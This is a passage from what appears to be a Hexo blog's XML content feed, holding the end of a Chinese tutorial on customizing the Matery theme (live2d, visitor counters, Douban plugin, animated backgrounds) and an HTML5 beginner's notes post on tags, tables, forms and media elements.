  scriptFrom: local
  pluginRootPath: live2dw&#x2F;
  pluginJsPath: lib&#x2F;
  pluginModelPath: assets&#x2F;
  tagMode: false
  debug: false
  model:
    use: live2d-widget-model-koharu
  display:
    position: right
    width: 150
    height: 300
  mobile:
    show: false
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
注意：我安装了live2d之后再运行时报了个错，很多插件就报错了，一个个的下载就好。</li>
</ol>
<h2 id="底部总浏览量和访问人数总是隐藏"><a href="#底部总浏览量和访问人数总是隐藏" class="headerlink" title="底部总浏览量和访问人数总是隐藏"></a>底部总浏览量和访问人数总是隐藏</h2><p>有时候请求busuanzi数据比较慢，然后浏览量和访问人数就会隐藏，可能是默认的，在matery.css中增加以下代码可以让它一直显示</p>
<h1 id="busuanzi-container-site-pv"><a href="#busuanzi-container-site-pv" class="headerlink" title="busuanzi_container_site_pv,"></a>busuanzi_container_site_pv,</h1><h1 id="busuanzi-value-site-pv"><a href="#busuanzi-value-site-pv" class="headerlink" title="busuanzi_value_site_pv,"></a>busuanzi_value_site_pv,</h1><h1 id="busuanzi-container-site-uv"><a href="#busuanzi-container-site-uv" class="headerlink" title="busuanzi_container_site_uv{"></a>busuanzi_container_site_uv{</h1><pre><code>  display: inline !important;
</code></pre><p>}</p>
<h2 id="豆瓣分享"><a href="#豆瓣分享" class="headerlink" title="豆瓣分享"></a>豆瓣分享</h2><p>安装插件</p>
<p><code>npm install hexo-douban --save</code></p>
<p>将下面的配置写入站点的配置文件 _config.yml 里(不是主题的配置文件).</p>
<pre class="line-numbers language-none"><code class="language-none">douban:
  user: mythsman
  builtin: false
  book:
    title: &#39;This is my book title&#39;
    quote: &#39;This is my book quote&#39;
  movie:
    title: &#39;This is my movie title&#39;
    quote: &#39;This is my movie quote&#39;
  game:
    title: &#39;This is my game title&#39;
    quote: &#39;This is my game quote&#39;
  timeout: 10000<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>user: 你的豆瓣ID.打开豆瓣，登入账户，然后在右上角点击 “个人主页” ，这时候地址栏的URL大概是这样：”<a href="https://www.douban.com/people/xxxxxx/">https://www.douban.com/people/xxxxxx/</a>“ ，其中的”xxxxxx”就是你的个人ID了。</p>
<p>builtin: 是否将生成页面的功能嵌入hexo s和hexo g中，默认是false,另一可选项为true(1.x.x版本新增配置项)。</p>
<p>title: 该页面的标题.</p>
<p>quote: 写在页面开头的一段话,支持html语法.</p>
<p>timeout: 爬取数据的超时时间，默认是 10000ms ,如果在使用时发现报了超时的错(ETIMEOUT)可以把这个数据设置的大一点。</p>
<p>如果只想显示某一个页面(比如movie)，那就把其他的配置项注释掉即可。</p>
<p>菜单参考，一定要有图标，不然不显示</p>
<p>然后再主题配置文件_config.yml中添加关于此页面的菜单：(下面是我的配置)</p>
<pre class="line-numbers language-none"><code class="language-none">menu:
    媒体:
       url: &#x2F;
       icon: fas fa-list
       children:
         - name: 电影
           url: &#x2F;movies
           icon: fas fa-film
         - name: 书单
           url: &#x2F;books
           icon: fas fa-book
         - name: 游戏
           url: &#x2F;games
           icon: fas fa-gamepad
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<blockquote>
<p>需要注意的是，通常大家都喜欢用 hexo d 来作为 hexo deploy 命令的简化，但是当安装了 hexo douban 之后，就不能用 hexo d 了，因为 hexo douban 跟 hexo deploy 的前缀都是 hexo d ，你以后执行的 hexo d 将不再是 Hexo 页面的生成，而是豆瓣页面的生成。</p>
</blockquote>
<h2 id="添加动态科技线条背景"><a href="#添加动态科技线条背景" class="headerlink" title="添加动态科技线条背景"></a>添加动态科技线条背景</h2><p>在themes/matery/layout/layout.ejs文件中添加如下代码：</p>
<!--动态线条背景-->
<p><script type="text/javascript"
color="122 103 238" opacity='0.7' zIndex="-2" count="200" src="//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js">
</script><br>其中：</p>
<ul>
<li>color：表示线条颜色，三个数字分别为(R,G,B)，默认：（0,0,0）</li>
<li>opacity：表示线条透明度（0~1），默认：0.5</li>
<li>count：表示线条的总数量，默认：150</li>
<li>zIndex：表示背景的z-index属性，css属性用于控制所在层的位置，默认：-1<h2 id="添加樱花飘落效果"><a href="#添加樱花飘落效果" class="headerlink" title="添加樱花飘落效果"></a>添加樱花飘落效果</h2>在themes/matery/source/js目录下新建sakura.js文件，打开这个网址<a href="https://cdn.jsdelivr.net/gh/Yafine/cdn@3.2.5/source/js/sakura.js">传送门</a>，将内容复制粘贴到sakura.js即可。</li>
</ul>
<p>然后再themes/matery/layout/layout.ejs文件内添加下面的内容：<br><pre class="line-numbers language-none"><code class="language-none">&lt;script type&#x3D;&quot;text&#x2F;javascript&quot;&gt;
&#x2F;&#x2F;只在桌面版网页启用特效
var windowWidth &#x3D; $(window).width();
if (windowWidth &gt; 768) &#123;
    document.write(&#39;&lt;script type&#x3D;&quot;text&#x2F;javascript&quot; src&#x3D;&quot;&#x2F;js&#x2F;sakura.js&quot;&gt;&lt;\&#x2F;script&gt;&#39;);
&#125;
&lt;&#x2F;script&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>
<h2 id="参考："><a href="#参考：" class="headerlink" title="参考："></a>参考：</h2><p>csdn<a href="https://blog.csdn.net/victoryxa/article/details/105841440?ops_request_misc=&amp;request_id=&amp;biz_id=102&amp;utm_term=hexomatery%E6%B7%BB%E5%8A%A0%E9%A1%B5%E9%9D%A2%E6%A8%B1%E8%8A%B1%E9%A3%98%E8%90%BD%E5%8A%A8%E6%95%88&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-3-105841440.pc_search_mgc_flag&amp;spm=1018.2226.3001.4187">matery</a></p>
]]></content>
      <categories>
        <category>hexo</category>
      </categories>
      <tags>
        <tag>hexo</tag>
      </tags>
  </entry>
  <entry>
    <title>html5笔记</title>
    <url>/2021/11/16/html5%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="html5笔记"><a href="#html5笔记" class="headerlink" title="html5笔记"></a>html5笔记</h1><h2 id="开发者工具VS-Code"><a href="#开发者工具VS-Code" class="headerlink" title="开发者工具VS Code"></a>开发者工具VS Code</h2><h3 id = "one">vscode插件推荐</h3>

<div class="table-container">
<table>
<thead>
<tr>
<th>插件</th>
<th>说明</th>
</tr>
</thead>
<tbody>
<tr>
<td>Open in Browser</td>
<td>右击选择浏览器打开html文件</td>
</tr>
<tr>
<td>Auto Rename Tag</td>
<td>自动重命名配对的HTML/XML标签</td>
</tr>
<tr>
<td>CSS Peek</td>
<td>追踪至样式</td>
</tr>
<tr>
<td>Community Material Theme</td>
<td>设置颜色主题</td>
</tr>
<tr>
<td>Live Server</td>
<td>自动监测代码修改并在浏览器响应</td>
</tr>
<tr>
<td>vscode-icons</td>
<td>设置文件图标作主题</td>
</tr>
</tbody>
</table>
</div>
<h3 id=""><a href="#" class="headerlink" title=" "></a> </h3><p>新建1.html文件</p>
<ol>
<li>! <code>&lt;Tab&gt;</code></li>
<li>! <code>enter</code><br>即可生成html文件<pre class="line-numbers language-none"><code class="language-none">&lt;!DOCTYPE html&gt;
&lt;html lang&#x3D;&quot;en&quot;&gt;
&lt;head&gt;
    &lt;meta charset&#x3D;&quot;UTF-8&quot;&gt;
    &lt;meta http-equiv&#x3D;&quot;X-UA-Compatible&quot; content&#x3D;&quot;IE&#x3D;edge&quot;&gt;
    &lt;meta name&#x3D;&quot;viewport&quot; content&#x3D;&quot;width&#x3D;device-width, initial-scale&#x3D;1.0&quot;&gt;
    &lt;title&gt;Document&lt;&#x2F;title&gt;
&lt;&#x2F;head&gt;
&lt;body&gt;
    
&lt;&#x2F;body&gt;
&lt;&#x2F;html&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h2 id="基本结构标签"><a href="#基本结构标签" class="headerlink" title="基本结构标签"></a>基本结构标签</h2>| 标签名  | 定义 | 说明|<br>| ————— |————— | ————— |<br>| <code>&lt;html&gt;&lt;/html&gt;</code>    | HTML标签    | 页面中的最大的标签，我们称为根标签|<br>| <code>&lt;head&gt;&lt;head&gt;</code>    | 文档的头部    | 注意在head标签中我们必须要设置的标签是title|<br>| <code>&lt;title&gt;&lt;/title&gt;</code>|     文档的标题    | 让页面拥有一个属于自己的网页标题|<br>| <code>&lt;body&gt;&lt;/body&gt;</code>    | 文档的主体    | 元素包含文档的所有内容，页面内容基本都是放到body里面的|<br>HTML 标签是由尖括号包围的关键词，例如 <code>&lt;html&gt;</code><br>HTML 标签通常是成对出现的，例如 <code>&lt;html&gt;</code>和<code>&lt;/html&gt;</code> ，我们称为双标签。标签对中的第一个标签是开始标签，第二个标签是结束标签。<br>有些特殊的标签必须是单个标签（极少情况），例如<code>&lt;br /&gt;</code>，我们称为单标签。</li>
</ol>
<h3 id="文档类型声明标签"><a href="#文档类型声明标签" class="headerlink" title="文档类型声明标签"></a>文档类型声明标签</h3><ul>
<li><code>&lt;!DOCTYPE&gt;</code>文档类型声明，作用就是告诉浏览器使用哪种HTML版本来显示网页。</li>
</ul>
<p><code>&lt;!DOCTYPE html&gt;</code></p>
<ul>
<li>这句代码的意思是: 当前页面采取的是 HTML5 版本来显示网页.</li>
<li><p>注意：</p>
<ul>
<li><code>&lt;!DOCTYPE&gt;</code> 声明位于文档中的最前面的位置，处于 <code>&lt;html&gt;</code> 标签之前。</li>
<li><code>&lt;!DOCTYPE&gt;</code> 不是一个 HTML 标签，它就是文档类型声明标签。<h3 id="lang语言种类"><a href="#lang语言种类" class="headerlink" title="lang语言种类"></a>lang语言种类</h3></li>
</ul>
</li>
<li><p>en 定义语言为英语</p>
</li>
<li>zh-CN 定义语言为中文</li>
</ul>
<p><code>&lt;html lang=&quot;en&quot;&gt;</code></p>
<blockquote>
<p>字符集charset 属性来规定 HTML 文档应该使用哪种字符编码。</p>
</blockquote>
<p><code>&lt;meta charset = &quot;UTF-8&quot; /&gt;</code></p>
<p>charset 常用的值有：：GB2312 、BIG5 、GBK 和 UTF-8，其中 UTF-8 也被称为万国码，基本包含了全世界所有国家需要用到的字符</p>
<h2 id="标签"><a href="#标签" class="headerlink" title="标签"></a>标签</h2><h3 id="标题标签"><a href="#标题标签" class="headerlink" title="标题标签"></a>标题标签</h3><pre class="line-numbers language-none"><code class="language-none">&lt;body&gt;
    &lt;h1&gt; 一级标题&lt;&#x2F;h1&gt;
        &#96;
        &#96;
        &#96;
    &lt;h6&gt; 六级标题&lt;&#x2F;h6&gt;
&lt;&#x2F;body&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h3 id="段落标签"><a href="#段落标签" class="headerlink" title="段落标签"></a>段落标签</h3><p><code>&lt;p&gt;段落标签&lt;/p&gt;</code></p>
<blockquote>
<p>paragraph 的缩写文本 在一个段落这种会根据浏览器窗口的大小进行自动换行 段落和段落之间保有空隙</p>
<h3 id="换行标签"><a href="#换行标签" class="headerlink" title="换行标签"></a>换行标签</h3><p><code>&lt;br /&gt;</code><br>这些在markdown里面也是通用的</p>
<h3 id="文本格式化标签"><a href="#文本格式化标签" class="headerlink" title="文本格式化标签"></a>文本格式化标签</h3><ol>
<li>加粗 <code>&lt;stong&gt;&lt;/stong&gt;</code></li>
<li>倾斜 <code>&lt;em&gt;&lt;/em&gt;</code></li>
<li>删除线 <code>&lt;del&gt;&lt;/del&gt;</code></li>
<li>下划线 <code>&lt;ins&gt;&lt;/ins&gt;</code></li>
</ol>
</blockquote>
<stong>在 markdown里面同样适用</stong>

<h3 id="盒子标签"><a href="#盒子标签" class="headerlink" title="盒子标签"></a>盒子标签</h3><ol>
<li><code>&lt;div&gt;&lt;/div&gt;</code> :可以看成是一个大盒子，独占一行</li>
<li><code>&lt;span&gt;&lt;/span&gt;</code> : 小盒子，一行可以放多个<br><div>mycar</div><br><span>mycar</span></li>
</ol>
<p><img src="https://www.mmrsl.cn/download/img/html5/1.png" alt=""></p>
<h3 id="图片标签"><a href="#图片标签" class="headerlink" title="图片标签"></a>图片标签</h3><p><code>&lt;img src=&quot;1.jpg&quot; alt=&quot;替换文本&quot;  title=&quot;提示文本&quot; /&gt;</code></p>
<ul>
<li>图片无法现实的时候显示替换文本</li>
<li>提示文本是鼠标放在图片上显示的文本</li>
</ul>
<h3 id="路径"><a href="#路径" class="headerlink" title="路径"></a>路径</h3><h4 id="相对路径"><a href="#相对路径" class="headerlink" title="相对路径"></a>相对路径</h4><ol>
<li>同一级路径        图形文件位于 HTML 文件同一级 如<code>&lt;img src=&quot;1.png&quot;&gt;</code></li>
<li>下一级路径    /    图形文件位于 HTML 文件下一级 如 <code>&lt;img src=&quot;img/1.png&quot;&gt;</code></li>
<li>上一级路径    …/    图形文件位于 HTML 文件上一级 如 <code>&lt;img src=&quot;../1.png&quot;&gt;</code></li>
</ol>
<p>和程序设计语言一样</p>
<h4 id="绝对路径"><a href="#绝对路径" class="headerlink" title="绝对路径"></a>绝对路径</h4><p>从最初始的路径开始的路径。</p>
<h3 id="超链接标签"><a href="#超链接标签" class="headerlink" title="超链接标签"></a>超链接标签</h3><p><code>&lt;a href=&quot;跳转目标&quot; target=&quot;目标窗口的弹出方式&quot;&gt;文本或图像&lt;/a&gt;</code></p>
<ol>
<li>href      用于指定链接目标的url地址。必须属性</li>
<li>target    用于指定连接页面的打开方式。_self为默认值，_blank为在新窗口中打开</li>
</ol>
<p>如果 href 里面地址是一个文件或者压缩包，会下载这个文件 <code>&lt;a href=&quot;img.jpg&quot;&gt;&lt;/a&gt;</code></p>
<h3 id="锚点链接"><a href="#锚点链接" class="headerlink" title="锚点链接"></a>锚点链接</h3><p>作用：点击链接，可以快速定位到页面中的某个位置</p>
<p>在链接文本的href属性中，设置属性值为 #名字<br>找到目标位置标签，里面添加一个 id属性=刚才的名字<br><pre class="line-numbers language-none"><code class="language-none">&lt;a href &#x3D; &quot;#one&quot;&gt;vscode插件推荐&lt;&#x2F;a&gt;
&lt;h3 id &#x3D; &quot;one&quot;&gt;vscode插件推荐&lt;&#x2F;h3&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><br>例如：<a href = "#one">vscode插件推荐</a></p>
<h3 id="表格标签"><a href="#表格标签" class="headerlink" title="表格标签"></a>表格标签</h3><pre class="line-numbers language-none"><code class="language-none">&lt;table&gt;
    &lt;tr&gt;  &lt;th&gt;table&lt;&#x2F;th&gt;     &lt;th&gt;用来定义表格的标签&lt;&#x2F;th&gt;            &lt;&#x2F;tr&gt;
    &lt;tr&gt;  &lt;td&gt;tr&lt;&#x2F;td&gt;     &lt;td&gt;用来定义表格中的行，必须嵌套在table &#x2F;table 标签中&lt;&#x2F;td&gt;              &lt;&#x2F;tr&gt;  
    &lt;tr&gt;  &lt;td&gt;td&lt;&#x2F;td&gt;     &lt;td&gt;用来定义表格中的单元格，必须嵌套在tr&#x2F;tr 标签中&lt;&#x2F;td&gt;              &lt;&#x2F;tr&gt;        
    &lt;tr&gt;  &lt;td&gt;th&lt;&#x2F;td&gt;     &lt;td&gt;用来定义表格中的表头，表头单元格里面的内容加粗居中显示&lt;&#x2F;td&gt;             &lt;&#x2F;tr&gt;                        
&lt;&#x2F;table&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>效果：</p>
<table>
    <tr>  <th>table</th>     <th>用来定义表格的标签</th>            </tr>
    <tr>  <td>tr</td>     <td>用来定义表格中的行，必须嵌套在table /table 标签中</td>              </tr>  
    <tr>  <td>td</td>     <td>用来定义表格中的单元格，必须嵌套在tr/tr 标签中</td>              </tr>        
    <tr>  <td>th</td>     <td>用来定义表格中的表头，表头单元格里面的内容加粗居中显示</td>             </tr>                        
</table>

<h3 id="表格属性"><a href="#表格属性" class="headerlink" title="表格属性"></a>表格属性</h3><p>表格标签的属性实际开发并不常用，因为基本都是通过后面的CSS来设置的</p>
<ol>
<li>align    left,center,right    规定表格相对周围元素的对齐方式</li>
<li>border    1或者’’ ‘’    规定表格单元是否拥有边框，默认为” “，表示没有边框</li>
<li>cellpadding    像素值    规定单元边沿与其内容之间的空白，默认1像素</li>
<li>cellspacing    像素值    规定单元格之间的空白，默认2像素</li>
<li>width    像素值或百分比    规定表格的宽度<br><code>&lt;table align=center border=&quot;1&quot; cellpadding=&quot;20&quot; cellspacing=&quot;0&quot; width=&quot;500&quot;&gt;</code><br>例如：<table align=center border="1" cellpadding="20" cellspacing="0" width="500">
 <tr>  <th>table</th>     <th>用来定义表格的标签</th>            </tr>
 <tr>  <td>tr</td>     <td>用来定义表格中的行，必须嵌套在table /table 标签中</td>              </tr>  
 <tr>  <td>td</td>     <td>用来定义表格中的单元格，必须嵌套在tr/tr 标签中</td>              </tr>        
 <tr>  <td>th</td>     <td>用来定义表格中的表头，表头单元格里面的内容加粗居中显示</td>             </tr>                        
</table>

</li>
</ol>
<h4 id="表格结构标签"><a href="#表格结构标签" class="headerlink" title="表格结构标签"></a>表格结构标签</h4><p>为了更好的表示表格的语义，可以将表格分割成 表格头部 和表格主体两大部分</p>
<ul>
<li>用 <code>&lt;thead&gt;&lt;/thead&gt;</code> 标签表示表格的头部区域，<code>&lt;thead&gt;</code>内部必须拥有<code>&lt;tr&gt;</code>标签，一般是位于第一行</li>
<li>用<code>&lt;tbody&gt;&lt;/tbody&gt;</code> 标签表示表格的主体区域，主要是用于放数据本体</li>
<li>以上标签都是放在<code>&lt;table&gt;&lt;/table&gt;</code>标签中</li>
</ul>
<h4 id="合并单元格"><a href="#合并单元格" class="headerlink" title="合并单元格"></a>合并单元格</h4><p>跨行合并：rowspan=“合并单元格的个数”<br>跨列合并：colspan=”合并单元格的个数”</p>
<p><code>&lt;td colspan = &quot;2&quot;&gt;&lt;/td&gt;</code></p>
<table align=center border="1" cellpadding="20" cellspacing="0" width="500">
    <tr>  <th>table</th>     <th>用来定义表格的标签</th>        <th>用来定义表格的标签</th>    </tr>
    <tr>  <td>tr</td>     <td>用来定义表格中的行，必须嵌套在table /table 标签中</td>       <td></td>       </tr>  
    <tr>  <td >td </td>            <td colspan = "2">用来定义表格中的单元格，必须嵌套在tr/tr 标签中</td>      </tr>        
    <tr>  <td>th</td>     <td>用来定义表格中的表头，表头单元格里面的内容加粗居中显示</td>        <th></th>     </tr>                        
</table>

<h3 id="列表标签"><a href="#列表标签" class="headerlink" title="列表标签"></a>列表标签</h3><ul>
<li><code>&lt;ul&gt;&lt;/ul&gt;</code>    无序列表    里面只能包含li，没有顺序。li里面可以包含任何标签</li>
<li><code>&lt;ol&gt;&lt;/ol&gt;</code>    有序列表    里面只能包含li，有顺序</li>
<li><code>&lt;dl&gt;&lt;/dl&gt;</code>    自定义列表    里面只能包含dt和dd，dt和dd里面可以放任何标签<ol>
   <li>关注我们</li>
   <li>新浪微博</li>
   <li>联系我们</li>
</ol>

</li>
</ul>
<h3 id="表单标签"><a href="#表单标签" class="headerlink" title="表单标签"></a>表单标签</h3><p>一个完整的表单通常由表单域，表单控件（表单元素）和提示信息3部分组成<br><img src="https://www.mmrsl.cn/download/img/html5/2.png" alt="表单标签" title="嘿嘿" /></p>
<h3 id="表单域"><a href="#表单域" class="headerlink" title="表单域"></a>表单域</h3><ul>
<li>表单域是一个包含表单元素的区域</li>
<li><code>&lt;form&gt;&lt;/from&gt;</code>标签用于定义表单域，会把它范围内的表单元素信息提交给服务器</li>
</ul>
<ol>
<li>action    url地址    用于指定接收并处理表单数据的服务器程序的url地址</li>
<li>method    get/post    用于设置表单数据的提交方式，其取值为get或post</li>
<li>name    名称    用于指定表单的名称，以区分同一个页面中的多个表单域<pre class="line-numbers language-none"><code class="language-none">&lt;form action&#x3D;&quot;url地址&quot; method&#x3D;&quot;提交方式&quot; name&#x3D;&quot;表单域的名称&quot;&gt;
    
&lt;&#x2F;form&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<h3 id="表单控件"><a href="#表单控件" class="headerlink" title="表单控件"></a>表单控件</h3><h4 id="输入元素"><a href="#输入元素" class="headerlink" title="输入元素"></a>输入元素</h4></li>
</ol>
<ul>
<li>input输入表单元素</li>
<li>input是个单标签，type 属性设置不同的属性用来指定不同的控件类型(文本字段、复选框、单选按钮、按钮等)</li>
</ul>
<ol>
<li>type 属性的属性值及描述如下：</li>
<li>button    定义可点击按钮(多数情况下，用于通过JavaScript启动脚本)</li>
<li>checkbox    定义复选框</li>
<li>file    定义输入字段和”浏览”按钮，供文件上传。</li>
<li>hidden    定义隐藏的输入字段</li>
<li>image    定义图像形式的提交按钮</li>
<li>password    定义密码字段。该字段中的字符被掩码</li>
<li>radio    定义单选按钮</li>
<li>reset    定义重置按钮。重置按钮会清楚表单中的所有数据。</li>
<li>submit    定义提交按钮。提交按钮会把表单数据发送到服务器。</li>
<li>text    定义单行的输入字段，用户可在其中输入文本。默认宽度为 20 个字符。</li>
</ol>
<p>除 type 属性外，<code>&lt;input&gt;</code>标签还有很多其他很多属性，其常用属性如下：</p>
<ol>
<li>name    由用户自定义    定义 input 元素的名称</li>
<li>value    由用户自定义    规定 input 元素的值</li>
<li>checked    checked    规定此 input 元素首次加载时应当被选中</li>
<li>maxlength    正整数    规定输入字段中字符的最大长度</li>
</ol>
<ul>
<li>name 和 value 是每个表单元素都有的属性值，主要给后端人员使用。</li>
<li>name 是表单元素的名字，要求 单选框和复选框要有相同的name值</li>
<li>checked 属性主要针对于单选框和复选框，主要作用是一打开页面，就可以默认选中某个表单元素</li>
</ul>
<h4 id="文本框与密码框"><a href="#文本框与密码框" class="headerlink" title="文本框与密码框"></a>文本框与密码框</h4><p>type 属性设置为 text 是文本框<br>type 属性设置为 password 是密码框</p>
<h4 id="单选框和复选框"><a href="#单选框和复选框" class="headerlink" title="单选框和复选框"></a>单选框和复选框</h4><p>type 属性设置为 radio 是单选框<br>type 属性设置为 checkbox 是复选框<br>name 是表单元素的名字，要求 单选框和复选框要有相同的name值</p>
<h4 id="name和value属性"><a href="#name和value属性" class="headerlink" title="name和value属性"></a>name和value属性</h4><p>name属性：当前input表单的名字，后台可以通过这个name属性找到这个表单，name的主要作用就是用于区别不同的表单</p>
<form>
        用户名：<input type="text" value="请输入用户名"> <br> 
        密码：<input type="password"> <br> 
        <!-- radio是单选框，可以多选一 -->
        <!-- name是表单元素的名字，这里的性别单选按钮必须有相同的名字name，才能实现多选一 -->
        性别：男<input type="radio" name="sex" value="男"> 女 <input type="radio" name="sex" value="女"><br>
        <!-- checkbox是多选框，可以多选 -->
        技能：html<input type="checkbox" name="habby" value="html">  java<input type="checkbox" name="habby" value="java">   python<input type="checkbox" name="habby" value="python"> 
</form>

<blockquote>
<p>注意：单选框和复选框name必须一致，value可以不一样</p>
</blockquote>
<h4 id="checked和maxlength"><a href="#checked和maxlength" class="headerlink" title="checked和maxlength"></a>checked和maxlength</h4><ul>
<li>单选按钮和复选框可以设置checked 属性</li>
<li>当页面打开时候就可以默认选中这个按钮</li>
<li>单选框只能给其中一个加checked，复选框可以多加</li>
<li>maxlength:规定最多输入多少个字符<br>性别:男<input type="radio" name="sex" value="男" checked="checked"> 女 <input type="radio" name="sex" value="女"></li>
</ul>
<h4 id="submit和reset"><a href="#submit和reset" class="headerlink" title="submit和reset"></a>submit和reset</h4><ul>
<li>type 属性设置为submit：提交按钮会把表单数据发送到服务器</li>
<li><code>`type</code> 属性设置为reset：重置按钮会清除表单中的所有数据</li>
</ul>
<h4 id="button和文件域"><a href="#button和文件域" class="headerlink" title="button和文件域"></a>button和文件域</h4><ul>
<li>type 属性设置为button：是一个按钮</li>
<li>type 属性设置为file：是一个文件域，可以上传文件</li>
</ul>
<p><input type="button" value="按钮"> <br><br><!-- 文件域：上传文件使用的 --><br>上传文件：<input type="file"></p>
<h4 id="label"><a href="#label" class="headerlink" title="label"></a>label</h4><ul>
<li>label标签用于绑定一个表单元素，当点击<lable>标签内的文本时，浏览器就会自动将焦点(光标)转到表单元素上，用来增加用户体验</li>
<li>label标签的 for属性 应当与相关元素的id 属性相同</li>
</ul>
<p><label for="sex"> 男 &lt;/lable&gt;</p>
<input type="radio" name="sex" id="sex" />

<h3 id="下拉列表"><a href="#下拉列表" class="headerlink" title="下拉列表"></a>下拉列表</h3><ul>
<li>下拉表单元素</li>
<li><code>&lt;select&gt;</code>中至少包含一对<code>&lt;option&gt;</code></li>
<li>在<code>&lt;option&gt;</code>中定义 <code>selected=&quot;selected&quot;</code> 时，当前项即为默认选中项。</li>
</ul>
<select>
       <option selected="selected">选项1</option>
       <option>选项2</option>
       <option>选项3</option>
       ...
</select>

<h3 id="textarea文本域元素🔥"><a href="#textarea文本域元素🔥" class="headerlink" title="textarea文本域元素🔥"></a>textarea文本域元素🔥</h3><ul>
<li><p>用于定义多行文本输入的控件</p>
<textarea>
  文本内容
</textarea>
</li>
<li><p>cols = “每行中的字符数” ， rows = “显示的函数”，我们在实际开发中不会使用，都是用CSS来改变大小</p>
</li>
</ul>
<h3 id="表单元素"><a href="#表单元素" class="headerlink" title="表单元素"></a>表单元素</h3><ul>
<li><code>input</code> 输入表单元素</li>
<li><code>select</code> 下拉表单元素</li>
<li><code>textarea</code> 文本域表单元素</li>
</ul>
<h2 id="HTML5提高"><a href="#HTML5提高" class="headerlink" title="HTML5提高"></a>HTML5提高</h2><blockquote>
<p>HTML5的新增特性主要是针对于以前的不足，增加了一些新的标签，新的表单和新的表单属性等。<br>这些新特性都有兼容性问题，基本都是IE9+以上版本的浏览器才支持，如果不考虑兼容性问题，可以大量使用这些新特性<br>HTML5有更大的技术集，允许更多样化和强大的网站和应用程序。增加了新特性：语义特性，本地存储特性，设备兼容特性，连接特性，网页多媒体特性，三维、图形及特效特性，性能与集成特性，CSS3特性。这个集合有时称为HTML5和朋友，通常缩写为HTML5</p>
<p>新增语义化标签</p>
<ul>
<li>&lt; header &gt; :头部标签</li>
<li>&lt; nav &gt;: 导航标签</li>
<li>&lt; article &gt;： 内容标签</li>
<li>&lt; section &gt;:定义文档某个区域</li>
<li>&lt; aside &gt;:侧边栏标签</li>
<li>&lt; footer &gt;: 尾部标签<br>–注意：<br>这种语义化标准主要是针对搜索引擎的,这些新标签页面中可以使用多次,在IE9中，需要把这些元素转换为块级元素,其实，移动端更喜欢使用这些标签<pre class="line-numbers language-none"><code class="language-none">&lt;style&gt;
        header, nav &#123;
            height: 120px;
            background-color: pink;
            border-radius: 15px;
            width: 800px;
            margin: 15px auto;
        &#125;
        section &#123;
            width: 500px;
            height: 300px;
            background-color: skyblue;
        &#125;
    &lt;&#x2F;style&gt;
&lt;&#x2F;head&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h3 id="新增视频标签"><a href="#新增视频标签" class="headerlink" title="新增视频标签"></a>新增视频标签</h3><pre class="line-numbers language-none"><code class="language-none">&lt;video src&#x3D;&quot;文件地址&quot;   controls&#x3D;&quot;controls&quot;&gt;&lt;&#x2F;video&gt;
&lt;style&gt;
        video &#123;
            width: 100%;
        &#125;
    &lt;&#x2F;style&gt;
&lt;&#x2F;head&gt;
&lt;body&gt;
    &lt;video src&#x3D;&quot;media&#x2F;mi.mp4&quot; autoplay&#x3D;&quot;autoplay&quot; muted&#x3D;&quot;muted&quot;  loop&#x3D;&quot;loop&quot; poster&#x3D;&quot;media&#x2F;mi9.jpg&quot;&gt;&lt;&#x2F;video&gt;
&lt;&#x2F;body&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<video src="https://www.mmrsl.cn/download/img/html5/1.mp4"   controls="controls"></video><style>
      video {
          width: 30%;
      }
</style>

</li>
</ul>
</blockquote>
<ol>
<li>autoplay    autoplay    视频就绪自动播放(谷歌浏览器需要添加muted来解决自动播放问题)</li>
<li>controls    controls    向用户显示播放控件</li>
<li>width    pixels(像素)    设置播放器宽度</li>
<li>height    pixels(像素)    设置播放器高度</li>
<li>loop    loop    播放完是否继续播放该视频,循环播放</li>
<li>preload    auto(预先加载视频)none(不应加载视频)    规定是否预加载视频(如果有了autoplay 就忽略该属性)</li>
<li>src    url    视频url的地址</li>
<li>poster    lmgurl    加载等待的画面图片</li>
<li>muted    muted    静音播放</li>
</ol>
<ul>
<li>一般不显示controls，让视频循环播放<h3 id="audio音频"><a href="#audio音频" class="headerlink" title="audio音频"></a>audio音频</h3><pre class="line-numbers language-none"><code class="language-none">&lt;audio src&#x3D;&quot;文件地址&quot; controls&#x3D;&quot;controls&quot;&gt;&lt;&#x2F;audio&gt;

&lt;audio src&#x3D;&quot;media&#x2F;music.mp3&quot; autoplay&#x3D;&quot;autoplay&quot; controls&#x3D;&quot;controls&quot;&gt;&lt;&#x2F;audio&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<audio src="media/music.mp3" autoplay="autoplay" controls="controls"></audio>
</li>
</ul>
<ol>
<li>autoplay    autoplay    如果出现该属性，则音频在就绪后马上播放</li>
